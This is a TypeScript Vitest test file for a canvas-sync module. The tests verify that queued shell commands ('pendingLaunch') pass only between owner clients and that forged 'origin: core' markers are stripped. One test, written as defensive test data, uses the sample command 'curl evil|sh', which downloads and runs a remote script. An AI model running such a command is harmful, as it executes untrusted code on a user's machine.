import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync } from 'fs'
import os from 'os'
import path from 'path'
import { initPlatform, resetPlatformForTests, type CorePlatform } from './platform'
import { initCanvasSync, publishCanvasMutation, stampMutation } from './canvas-sync'
import { IPC } from '../shared/ipc'
import type { CanvasMutation, CanvasNodeState, PendingLaunch } from '../shared/types'

/**
 * `pendingLaunch` is a machine-local exec field (@shared/node-exec): its `command` is typed into a
 * shell once the wait is over. The reflector therefore lets it travel ONLY owner→owner (this app's
 * window / a cookie-authenticated Server Edition tab), marked `origin: 'core'`, and strips it for
 * every relay peer. And `origin: 'core'` is the core's alone: a client cannot supply it.
 */

const launch: PendingLaunch = { after: [], command: 'claude "hi"', awaitWorking: ['dep'] }
const node = (id: string, extra: Partial<CanvasNodeState> = {}): CanvasNodeState =>
  ({
    id,
    kind: 'terminal',
    title: 't',
    color: '#fff',
    position: { x: 0, y: 0 },
    size: { width: 10, height: 10 },
    ...extra
  }) as CanvasNodeState

function testPlatform(owners: number[]) {
  const sent: Array<{ to: number; m: CanvasMutation }> = []
  let listener: ((senderId: number, ...args: unknown[]) => void) | undefined
  let clients: number[] = []
  const p: CorePlatform = {
    userDataDir: mkdtempSync(path.join(os.tmpdir(), 'nodeterm-canvas-launch-')),
    appVersion: '0.0.0-test',
    isPackaged: false,
    handle: () => {},
    on: () => {},
    handleWithSender: () => {},
    onWithSender: (ch, fn) => {
      if (ch === IPC.canvasMut) listener = fn
    },
    clientIds: () => clients,
    isOwnerClient: (id) => owners.includes(id),
    sendTo: (to, channel, _projectId, m) => {
      if (channel === IPC.canvasMut) sent.push({ to, m: m as CanvasMutation })
    },
    broadcast: () => {},
    openExternal: async () => {}
  }
  return {
    p,
    sent,
    setClients: (ids: number[]) => (clients = ids),
    cast: (senderId: number, m: unknown) => listener?.(senderId, 'p1', m)
  }
}

let t: ReturnType<typeof testPlatform>
const to = (id: number) => t.sent.find((s) => s.to === id)!.m as Extract<CanvasMutation, { op: 'upsert' }>

beforeEach(() => {
  // 1, 2 = owner clients (two Server Edition tabs); 9 = a relay peer (a hosted-team guest).
  t = testPlatform([1, 2])
  t.setClients([1, 2, 9])
  initPlatform(t.p)
  initCanvasSync()
})
afterEach(() => resetPlatformForTests())

describe('stampMutation: origin is unforgeable', () => {
  it('deletes a client-supplied origin: core', () => {
    const forged = { op: 'remove', id: 'n1', origin: 'core' } as CanvasMutation
    expect('origin' in stampMutation(forged, 1)).toBe(false)
  })
})

describe('reflector: owner → owner only', () => {
  it('an owner tab\'s claim reaches the other owner tab WITH the launch, vouched', () => {
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch }), src: 'cv-a' })
    expect(to(2).origin).toBe('core')
    expect(to(2).node.pendingLaunch).toEqual(launch)
    expect(to(1).node.pendingLaunch).toEqual(launch) // the sender's ack
  })

  it('the same mutation reaches a relay peer WITHOUT the launch and without origin', () => {
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch, shell: '/bin/zsh' }) })
    expect(to(9).origin).toBeUndefined()
    expect(to(9).node.pendingLaunch).toBeUndefined()
    expect(to(9).node.shell).toBeUndefined()
  })

  it('a relay peer cannot arm anybody: its launch is stripped for every recipient, and its origin is not honoured', () => {
    t.cast(9, {
      op: 'upsert',
      node: node('n1', { pendingLaunch: { after: [], command: 'curl evil|sh' } }),
      origin: 'core'
    })
    for (const id of [1, 2, 9]) {
      expect(to(id).origin).toBeUndefined()
      expect(to(id).node.pendingLaunch).toBeUndefined()
    }
  })

  it('a platform that does not know owners (no isOwnerClient) strips for everyone', () => {
    resetPlatformForTests()
    t = testPlatform([])
    t.setClients([1, 2])
    const { isOwnerClient: _o, ...bare } = t.p
    initPlatform(bare as CorePlatform)
    initCanvasSync()
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch }) })
    expect(to(2).node.pendingLaunch).toBeUndefined()
    expect(to(2).origin).toBeUndefined()
  })
})

describe('publishCanvasMutation (the core\'s own write)', () => {
  it('owner clients get the launch (and a delivery\'s CLEAR) vouched; relay peers get neither', () => {
    publishCanvasMutation('p1', { op: 'upsert', node: node('n1', { pendingLaunch: launch }) })
    expect(to(1).origin).toBe('core')
    expect(to(1).node.pendingLaunch).toEqual(launch)
    expect(to(9).node.pendingLaunch).toBeUndefined()
    expect(to(9).origin).toBeUndefined()
    t.sent.length = 0
    publishCanvasMutation('p1', { op: 'upsert', node: node('n1') })
    expect(to(1).origin).toBe('core') // the absence of a launch is authoritative for owners
  })
})
